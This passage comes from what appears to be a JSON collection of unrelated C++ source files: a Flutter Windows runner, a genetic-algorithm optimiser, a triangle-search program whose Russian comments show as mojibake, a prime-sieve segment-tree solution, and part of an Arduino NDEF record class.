WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_json\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <set>\n#include <random>\n#include <numeric>\n\nconstexpr int POPULATION_SIZE = 1000;\nconstexpr int MAX_GENERATIONS = 10000;\nconstexpr double MUTATION_RATE = 0.7;\nconstexpr double MIN_VAL = 0.0;\nconstexpr double MAX_VAL = 1.0;\n\n// Use random number engine for better random number generation\nstd::random_device rd;\nstd::mt19937 gen(rd());\n\ndouble randVal(double min_val_, double max_val_)\n{\n    std::uniform_real_distribution<double> dis(min_val_, max_val_);\n    return dis(gen);\n}\n\n// The problem to optimize\ndouble foo(const double & x, const double & y, const double & z)\n{\n    return fabs(6 * pow(x, 3) + 9 * pow(y, 2) + 90 * z - 25);\n}\n\n// 2. Fitness Evaluation - Evaluate the fitness of each solution in the population based on some predefined criteria\ndouble fitnessEval(const double & x, const double & y, const double & z)\n{\n    double ans = foo(x, y, z);\n    return (ans == 0) ? INT_MAX : fabs(1 / ans);\n}\n\n// A potential solution\nstruct Solution\n{\n    double x, y, z;\n\tdouble fitness;\n\n    Solution() = default;\n\n    Solution(const double & x_, const double & y_, const double & z_)\n        : x(x_)\n        , y(y_)\n        , z(z_)\n        , fitness(fitnessEval(x_, y_, z_)) {}\n\n    bool operator>(const Solution & other) const\n    {\n        return fitness > other.fitness;\n    }\n\n    friend std::ostream & operator<<(std::ostream & os, const Solution & obj)\n    {\n        os << \"x = \" << obj.x << \", \"\n           << \"y = \" << obj.y << \", \"\n           << \"z = \" << obj.z << \", \"\n           << \"Fitness = \" << obj.fitness;\n        return os;\n    }\n};\n\n// 1. Initialization - Generate an initial population of potential solutions randomly\nvoid initPopulation(std::vector<Solution> & population)\n{\n\tfor (int i = 0; i < POPULATION_SIZE; ++i)\n\t{\n        population[i] = Solution(randVal(MIN_VAL, MAX_VAL), randVal(MIN_VAL, MAX_VAL), randVal(MIN_VAL, MAX_VAL));\n\t}\n}\n\n// 3. Selection - Select individuals from the current population based on their fitness, favoring better individuals\nvoid selection(std::vector<Solution> & population)\n{\n    population.resize((size_t)(std::ceil(population.size() * 0.6)));\n}\n\n// 4. Recombination (Crossover) - Create new solutions by combining genetic material from selected individuals\nSolution crossover(const Solution & parent1, const Solution & parent2)\n{\n    Solution child((parent1.x + parent2.x) / 2.0, (parent1.y + parent2.y) / 2.0, (parent1.z + parent2.z) / 2.0);\n    return child;\n}\n\n// 5. Mutation - Introduce random changes in the new solutions to maintain genetic diversity and explore new regions of the solution space\nvoid mutate(Solution & child)\n{\n    if (randVal(0, 1) < MUTATION_RATE)\n    {\n        child.x *= randVal(0.99, 1.01);\n        child.y *= randVal(0.99, 1.01);\n        child.z *= randVal(0.99, 1.01);\n        child.fitness = fitnessEval(child.x, child.y, child.z);\n    }\n}\n\nstd::vector<Solution> generation(std::vector<Solution> & population)\n{\n    selection(population);\n    std::vector<Solution> newPopulation;\n\n    std::uniform_int_distribution<int> dis(0, population.size() - 1);\n    for (int i = 0; i < population.size(); i += 2)\n    {\n        Solution child = crossover(population[dis(gen)], population[dis(gen)]);\n        mutate(child);\n        newPopulation.push_back(child); // 6. Replacement - Replace the old population with the new population of solutions\n    }\n\n    return newPopulation;\n}\n\nvoid geneticAlgorithm()\n{\n    std::vector<Solution> population(POPULATION_SIZE);\n\n    initPopulation(population);\n    std::sort(population.begin(), population.end(), std::greater<Solution>());\n    std::cout << \"Generation \" << 0 << \" best solution: \" << std::endl << population[0] << std::endl;\n\n    for (int i = 1; i <= MAX_GENERATIONS; ++i)\n    {\n        population = generation(population);\n        std::sort(population.begin(), population.end(), std::greater<Solution>());\n        std::cout << \"Generation \" << i << \" best solution: \" << std::endl << population[0] << std::endl;\n\n        // 7. Termination - Check if termination conditions are met (satisfactory solution found or maximum number of generations reached)\n        if (population[0].fitness > 999)\n        {\n            break;\n        }\n    }\n\n    std::cout << \"foo(x, y, z) = \" << foo(population[0].x, population[0].y, population[0].z);\n\n    int a;\n    std::cin >> a;\n}\n\nint main()\n{\n    geneticAlgorithm();\n    return 0;\n}\n",
    "// \u00cd\u00e0\u00e9\u00f2\u00e8 \u00f2\u00f0\u00e8 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00f1 \u00e2\u00e5\u00f0\u00f8\u00e8\u00ed\u00e0\u00ec\u00e8 \u00e2 \u00e7\u00e0\u00e4\u00e0\u00ed\u00ed\u00ee\u00ec \u00ec\u00ed\u00ee\u00e6\u00e5\u00f1\u00f2\u00e2\u00e5 \u00e8\u00e7 n \u00f2\u00ee\u00f7\u00e5\u00ea \u00ed\u00e0\n// \u00ef\u00eb\u00ee\u00f1\u00ea\u00ee\u00f1\u00f2\u00e8 \u00f2\u00e0\u00ea, \u00f7\u00f2\u00ee\u00e1\u00fb \u00e2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00eb\u00e5\u00e6\u00e0\u00eb \u00f1\u00f2\u00f0\u00ee\u00e3\u00ee \u00e2\u00ed\u00f3\u00f2\u00f0\u00e8 \u00ef\u00e5\u00f0\u00e2\u00ee\u00e3\u00ee, \u00e0\n// \u00f2\u00f0\u00e5\u00f2\u00e8\u00e9 \u00e2\u00ed\u00f3\u00f2\u00f0\u00e8 \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee.\n\n#include <iostream>\n#include <Windows.h>\n#include <fstream>\n#include<array>\n\nusing namespace std;\n\n//\u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00f2\u00ee\u00f7\u00ea\u00e0\nstruct Point\n{\n\tdouble x, y;\n};\n\n//\u00e2\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f1 \u00ea\u00eb\u00e0\u00e2\u00e8\u00e0\u00f2\u00f3\u00f0\u00fb\npair<Point*, int> Rkey()\n{\n\tint n;\n\tcout << endl << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f2\u00ee\u00f7\u00e5\u00ea \u00e2 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e5:  \";\n\tcin >> n;\n\tPoint* mas = new Point[n];\n\tcout << endl;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 x \u00e8 y \u00f2\u00ee\u00f7\u00ea\u00e8 [\"<<i+1<<\"]: \";\n\t\tcin >> mas[i].x;\n\t\tcin >> mas[i].y;\n\t}\n\treturn make_pair(mas, n);\n}\n\n//\u00e2\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f1 \u00f4\u00e0\u00e9\u00eb\u00e0\npair<Point*, int> Rfile()\n{\n\tifstream fin(\"input.txt\");\n\tint N, k;\n\tint A[1000];\n\tPoint* mas;\n\tif (!fin.good())\n\t{\n\t\tcout << \"\u00d4\u00e0\u00e9\u00eb input.txt \u00ed\u00e5 \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed!\" << endl;\n\t}\n\telse\n\t{\n\t\tk = 0;\n\t\twhile (fin >> N)\n\t\t{\n\t\t\tA[k++] = N;\n\t\t}\n\t\tmas = new Point[k / 2];\n\t\tfor (int i = 0; i < k; i += 2)\n\t\t{\n\t\t\tmas[i / 2].x = A[i];\n\t\t\tmas[i / 2].y = A[i + 1];\n\t\t}\n\t\tfin.close();\n\t\treturn make_pair(mas, k / 2);\n\t}\n\tfin.close();\n\treturn make_pair(mas, 0);\n}\n\n//\u00e2\u00fb\u00e2\u00ee\u00e4 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 \u00f2\u00ee\u00f7\u00e5\u00ea\nvoid writeP(Point* mas,int n)\n{\n\tcout << \"\u00c2\u00f5\u00ee\u00e4\u00ed\u00ee\u00e9 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2 \u00f2\u00ee\u00f7\u00e5\u00ea:\" << endl;\n\tfor (int i = 0; i <n; i++)\n\t{\n\t\tcout << \"[\" << mas[i].x << \"; \" << mas[i].y << \"]    \";\n\t}\n\tcout << endl;\n}\n//\u00ff\u00e2\u00eb\u00ff\u00fe\u00f2\u00f1\u00ff \u00eb\u00e8 \u00f2\u00f0\u00e8 \u00f2\u00ee\u00f7\u00ea\u00e8 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00ee\u00ec\nbool trian(Point a, Point b, Point c)\n{\n\tdouble lab, lac, lbc;\n\tlab = sqrt(pow((a.x - b.x), 2) + pow((a.y - b.y), 2));\n\tlac = sqrt(pow((a.x - c.x), 2) + pow((a.y - c.y), 2));\n\tlbc = sqrt(pow((b.x - c.x), 2) + pow((b.y - c.y), 2));\n\tif (lab + lac > lbc)\n\t\treturn true;\n\telse\n\t\tif (lab + lbc > lac)\n\t\t\treturn true;\n\t\telse\n\t\t\tif (lac + lbc > lab)\n\t\t\t\treturn true;\n\t\t\telse\n\t\t\t\treturn false;\n}\n\nbool IsPIn_(Point a, Point b, Point c, Point p)\n{\n\tint af = (a.x - p.x) * (b.y - a.y) - (b.x - a.x) * (a.y - p.y);\n\tint bf = (b.x - p.x) * (c.y - b.y) - (c.x - b.x) * (b.y - p.y);\n\tint cf = (c.x - p.x) * (a.y - c.y) - (a.x - c.x) * (c.y - p.y);\n\n\tif ((af > 0 && bf > 0 && cf > 0) || (af < 0 && bf < 0 && cf < 0))\n\t{\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\n//\u00ef\u00ee\u00e8\u00f1\u00ea \u00f2\u00f0\u00e5\u00f5 \u00e2\u00eb\u00ee\u00e6\u00e5\u00ed\u00ed\u00fb\u00f5 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00ee\u00e2\nvoid serh(Point* mas, int n)\n{\n\tint trian1[3];\n\tint trian2[3];\n\tint trian3[3];\n\tbool ress = false;\n\t//\u00ef\u00e5\u00f0\u00e2\u00fb\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\n\tfor (int i1 = 0; i1 < n - 2; i1++)\n\t{\n\t\tfor (int j1 = i1+1; j1 < n - 1; j1++)\n\t\t{\n\t\t\tfor (int k1 = j1+1; k1 < n; k1++)\n\t\t\t{\n\t\t\t\tif (trian(mas[i1], mas[j1], mas[k1]))\n\t\t\t\t{\n\t\t\t\t\t//\u00cf\u00e5\u00f0\u00e2\u00fb \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\ttrian1[0] = i1; trian1[1] = j1; trian1[2] = k1;\n\t\t\t\t\t//\u00ef\u00ee\u00e8\u00f1\u00ea \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0\n\t\t\t\t\tfor (int i2 = 0; i2 < n-2 ; i2++)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[i2])\n\t\t\t\t\t\t\t&& (i2 !=i1 ) && i2!=j1 &&i2!=k1)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tfor (int j2 = i2 + 1; j2 < n - 1; j2++)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[j2])\n\t\t\t\t\t\t\t\t\t&& (j2 != i1) && j2 != j1 && j2 != k1)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tfor (int k2 = j2 + 1; k2 < n; k2++)\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian1[0]], mas[trian1[1]], mas[trian1[2]], mas[k2])\n\t\t\t\t\t\t\t\t\t\t\t&& (k2 != i1) && k2 != j1 && k2 != k1)\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tif (trian(mas[i2], mas[j2], mas[k2]))\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t//\u00c2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\t\t\t\t\t\t\t\ttrian2[0] = i2; trian2[1] = j2; trian2[2] = k2;\n\t\t\t\t\t\t\t\t\t\t\t\t//\u00cf\u00ee\u00e8\u00f1\u00ea \u00f2\u00f0\u00e5\u00f2\u00fc\u00e5\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0\n\t\t\t\t\t\t\t\t\t\t\t\tfor (int i3 = 0; i3 < n - 2; i3++)\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[i3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (i3 != i2) && i3 != j2 && i3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor (int j3 = i3 + 1; j3 < n - 1; j3++)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[j3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (j3 != i2) && j3 != j2 && j3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor (int k3 = j3 + 1; k3 < n; k3++)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (IsPIn_(mas[trian2[0]], mas[trian2[1]], mas[trian2[2]], mas[k3])\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t&& (k3 != i2) && k3 != j2 && k3 != k2)\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (trian(mas[i3], mas[j3], mas[k3]))\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tress = true;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//\u00c2\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea \u00ed\u00e0\u00e9\u00e4\u00e5\u00ed\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\ttrian3[0] = i3; trian3[1] = j3; trian3[2] = k3;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"===============================================\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00ef\u00e5\u00f0\u00e2\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00e8\u00ec\u00e5\u00fe\u00f2 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00fb:\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"[{\" << mas[trian1[0]].x << \" \" << mas[trian1[0]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian1[1]].x << \" \" << mas[trian1[1]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian1[2]].x << \" \" << mas[trian1[2]].y << \"}]\" << endl;\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00e2\u00f2\u00ee\u00f0\u00ee\u00e3\u00ee \u00f2\u00f0\u00e5\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea\u00e0 \u00e8\u00ec\u00e5\u00fe\u00f2 \u00ea\u00ee\u00ee\u00f0\u00e4\u00e8\u00ed\u00e0\u00f2\u00fb:\" << endl;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"[{\" << mas[trian2[0]].x << \" \" << mas[trian2[0]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian2[1]].x << \" \" << mas[trian2[1]].y <<\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\"}{\" << mas[trian2[2]].x << \" \" << mas[trian2[2]].y << \"}]\" << endl;\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcout << \"\u00c2\u00e5\u00f0\u00f8\u00e8\u00ed\u00fb \u00f2\u00f0\u00e5\u00f2\u00fc\u00e5\u00e3\u00ee ",
    "#include <bits/stdc++.h>\n\nusing namespace std;\nusing LL = long long;\n\nconst int N = 1e5 + 5;\nconst int NAX = (int) 1e7 + 1;\n\nbool is_com[NAX];\nvector<int> prime;\n\nvoid sieve() {\n\tfor (int i = 2; i < NAX; ++i) {\n\t\tif (!is_com[i]) {\n\t\t\tprime.push_back(i); \n\t\t}\n\t\tfor (int j = 0; j < (int) prime.size() and 1LL * prime[j] * i < NAX; ++j) {\n\t\t\tis_com[prime[j] * i] = true;\n\t\t\tif (i % prime[j] == 0) break; \n\t\t}\n\t}\n\tprime.push_back(NAX);\n}\n\nstruct ST {\n  int tree[4 * N];\n  static const int inf = 1e9;\n  ST() {\n    memset(tree, 0, sizeof tree);\n  }\n  void build(int node, int b, int e) {\n    if (b == e) {\n      tree[node] = 0;\n      return;\n    }\n    int mid = (b + e) >> 1, l = node << 1, r = l | 1;\n    build(l, b, mid);\n    build(r, mid + 1, e);\n    tree[node] = tree[l] + tree[r]; // change this\n  }\n  void update(int node, int b, int e, int i, int x) {\n    if (b > i || e < i) return;\n    if (b == e && b == i) {\n      tree[node] += x; // update\n      return;\n    }\n    int mid = (b + e) >> 1, l = node << 1, r = l | 1;\n    update(l, b, mid, i, x);\n    update(r, mid + 1, e, i, x);\n    tree[node] = tree[l] + tree[r]; // change this\n  }\n  int query(int node, int b, int e, int i, int j) {\n    if (b > j || e < i) return 0; // return appropriate value\n    if (b >= i && e <= j) return tree[node];\n    int mid = (b + e) >> 1, l = node << 1, r = l | 1;\n    return (query(l, b, mid, i, j) + query(r, mid + 1, e, i, j)); // change this\n  }\n  int find(int node, int b, int e, int k) {\n  \tif (b == e) return b;\n    int mid = (b + e) >> 1, l = node << 1, r = l | 1;\n    if (k <= tree[l]) return find(l, b, mid, k);\n    else return find(r, mid + 1, e, k - tree[l]); // change this\n  }\n}t;\n\n\nvoid solve() {\n\tint n, q; cin >> n >> q;\n\tint ara[n + 1];\n\tt.build(1, 1, n);\n\tfor (int i = 1; i <= n; ++i) {\n\t\tcin >> ara[i];\n\t\tif (*lower_bound(prime.begin(), prime.end(), ara[i]) == ara[i]) t.update(1, 1, n, i, 1);\n\t}\n\twhile (q--) {\n\t\tint typ; cin >> typ;\n\t\tif (typ == 1) {\n\t\t\tint pos; cin >> pos;\n\t\t\tint sum = t.query(1, 1, n, 1, pos - 1);\n\t\t\tint is = (sum != 0);\n\t\t\tint ltPos = t.find(1, 1, n, sum);\n\t\t\tif (t.query(1, 1, n, pos + 1, n) >= 1) sum += 1 + t.query(1, 1, n, pos, pos);\n\t\t\telse {\n\t\t\t\tcout << max(pos - ltPos - is, 0) + (n - pos) << \"\\n\";\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tint rtPos = t.find(1, 1, n, sum);\n\t\t\tcout << max(pos - ltPos - is, 0) + max(rtPos - pos - 1, 0) << \"\\n\";\n\t\t} else {\n\t\t\tint pos, val; cin >> pos >> val;\n\t\t\tif (*lower_bound(prime.begin(), prime.end(), ara[pos]) == ara[pos]) t.update(1, 1, n, pos, -1);\n\t\t\tif (*lower_bound(prime.begin(), prime.end(), val) == val) t.update(1, 1, n, pos, 1);\n\t\t\tara[pos] = val;\n\t\t}\n\t}\n}\n\nint main() {\n    ios_base::sync_with_stdio(0);\n    cin.tie(0);\n    int t = 1; \n    sieve();\n    cerr << prime.size();\n    // cin >> t;\n    // while(t--) solve();\n}\n",
    "#include \"NdefRecord.h\"\n\nNdefRecord::NdefRecord()\n{\n    //Serial.println(\"NdefRecord Constructor 1\");\n    _tnf = 0;\n    _typeLength = 0;\n    _payloadLength = 0;\n    _idLength = 0;\n    _type = (byte *)NULL;\n    _payload = (byte *)NULL;\n    _id = (byte *)NULL;\n}\n\nNdefRecord::NdefRecord(const NdefRecord& rhs)\n{\n    //Serial.println(\"NdefRecord Constructor 2 (copy)\");\n\n    _tnf = rhs._tnf;\n    _typeLength = rhs._typeLength;\n    _payloadLength = rhs._payloadLength;\n    _idLength = rhs._idLength;\n    _type = (byte *)NULL;\n    _payload = (byte *)NULL;\n    _id = (byte *)NULL;\n\n    if (_typeLength)\n    {\n        _type = (byte*)malloc(_typeLength);\n        memcpy(_type, rhs._type, _typeLength);\n    }\n\n    if (_payloadLength)\n    {\n        _payload = (byte*)malloc(_payloadLength);\n        memcpy(_payload, rhs._payload, _payloadLength);\n    }\n\n    if (_idLength)\n    {\n        _id = (byte*)malloc(_idLength);\n        memcpy(_id, rhs._id, _idLength);\n    }\n\n}\n\n// TODO NdefRecord::NdefRecord(tnf, type, payload, id)\n\nNdefRecord::~NdefRecord()\n{\n    //Serial.println(\"NdefRecord Destructor\");\n    if (_typeLength)\n    {\n        free(_type);\n    }\n\n    if (_payloadLength)\n    {\n        free(_payload);\n    }\n\n    if (_idLength)\n    {\n        free(_id);\n    }\n}\n\nNdefRecord& NdefRecord::operator=(const NdefRecord& rhs)\n{\n    //Serial.println(\"NdefRecord ASSIGN\");\n\n    if (this != &rhs)\n    {\n        // free existing\n        if (_typeLength)\n        {\n            free(_type);\n        }\n\n        if (_payloadLength)\n        {\n            free(_payload);\n        }\n\n        if (_idLength)\n        {\n            free(_id);\n        }\n\n        _tnf = rhs._tnf;\n        _typeLength = rhs._typeLength;\n        _payloadLength = rhs._payloadLength;\n        _idLength = rhs._idLength;\n\n        if (_typeLength)\n        {\n            _type = (byte*)malloc(_typeLength);\n            memcpy(_type, rhs._type, _typeLength);\n        }\n\n        if (_payloadLength)\n        {\n            _payload = (byte*)malloc(_payloadLength);\n            memcpy(_payload, rhs._payload, _payloadLength);\n        }\n\n        if (_idLength)\n        {\n            _id = (byte*)malloc(_idLength);\n            memcpy(_id, rhs._id, _idLength);\n        }\n    }\n    return *this;\n}\n\n// size of records in bytes\nint NdefRecord::getEncodedSize()\n{\n    int size = 2; // tnf + typeLength\n    if (_payloadLength > 0xFF)\n    {\n        size += 4;\n    }\n    else\n    {\n        size += 1;\n    }\n\n    if (_idLength)\n    {\n        size += 1;\n    }\n\n    size += (_typeLength + _payloadLength + _idLength);\n\n    return size;\n}\n\nvoid NdefRecord::encode(byte *data, bool firstRecord, bool lastRecord)\n{\n    // assert data > getEncodedSize()\n\n    uint8_t* data_ptr = &data[0];\n\n    *data_ptr = getTnfByte(firstRecord, lastRecord);\n    data_ptr += 1;\n\n    *data_ptr = _typeLength;\n    data_ptr += 1;\n\n    if (_payloadLength <= 0xFF) {  // short record\n        *data_ptr = _payloadLength;\n        data_ptr += 1;\n    } else { // long format\n        // 4 bytes but we store length as an int\n        data_ptr[0] = 0x0; // (_payloadLength >> 24) & 0xFF;\n        data_ptr[1] = 0x0; // (_payloadLength >> 16) & 0xFF;\n        data_ptr[2] = (_payloadLength >> 8) & 0xFF;\n        data_ptr[3] = _payloadLength & 0xFF;\n        data_ptr += 4;\n    }\n\n    if (_idLength)\n    {\n        *data_ptr = _idLength;\n        data_ptr += 1;\n    }\n\n    //Serial.println(2);\n    memcpy(data_ptr, _type, _typeLength);\n    data_ptr += _typeLength;\n\n    if (_idLength)\n    {\n        memcpy(data_ptr, _id, _idLength);\n        data_ptr += _idLength;\n    }\n    \n    memcpy(data_ptr, _payload, _payloadLength);\n    data_ptr += _payloadLength;\n}\n\nbyte NdefRecord::getTnfByte(bool firstRecord, bool lastRecord)\n{\n    int value = _tnf;\n\n    if (firstRecord) { // mb\n        value = value | 0x80;\n    }\n\n    if (lastRecord) { //\n        value = value | 0x40;\n    }\n\n    // chunked flag is always false for now\n    // if (cf) {\n    //     value = value | 0x20;\n    // }\n\n    if (_payloadLength <= 0xFF) {\n        value = value | 0x10;\n    }\n\n    if (_idLength) {\n        value = value | 0x8;\n    }\n\n    return value;\n}\n\nbyte NdefRecord::getTnf()\n{\n    return _tnf;\n}\n\nvoid NdefRecord::setTnf(byte tnf)\n{\n    _tnf = tnf;\n}\n\nunsigned int NdefRecord::getTypeLength()\n{\n    return _typeLength;\n}\n\nint NdefRecord::getPayloadLength()\n{\n    return _payloadLength;\n}\n\nunsigned int NdefRecord::getIdLength()\n{\n    return _idLength;\n}\n\nString NdefRecord::getType()\n{\n    char type[_typeLength + 1];\n    memcpy(type, _type, _typeLength);\n    type[_typeLength] = '\\0'; // null terminate\n    return String(type);\n}\n\n// this assumes the caller created type correctly\nvoid NdefRecord::getType(uint8_t* type)\n{\n    memcpy(type, _type, _typeLength);\n}\n\nvoid NdefRecord::setType(const byte * type, const unsigned int numBytes)\n{\n    if(_typeLength)\n    {\n        free(_type);\n    }\n\n    